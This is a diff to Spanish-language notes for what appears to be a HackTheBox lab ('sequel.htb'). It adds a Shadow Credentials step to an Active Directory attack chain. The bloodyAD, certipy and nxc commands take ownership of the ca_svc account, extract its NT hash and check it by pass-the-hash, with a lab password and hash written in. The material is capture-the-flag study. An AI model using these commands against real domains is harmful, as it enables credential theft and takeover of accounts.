@@ -288,6 +288,8 @@ Buscamos a un usuario que tenemos `pwned`
 En `Outbound Object control`
 ![[Pasted image 20260211202116.png]]
 
+### Shadow Credentials
+
 Nos hacemos owned de `ca_svc` con el usuario `ryan`
 ```shell
 bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
@@ -298,3 +300,12 @@ Y después darle control total a `ryan`
 bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
 ```
 
+Con la herramienta [[CERTIPY]] obtenemos el hash NT
+```shell
+certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.232.128
+```
+
+Con ese hash verificamos si es valido para el usuario `ca_svc`
+```shell
+nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
+```
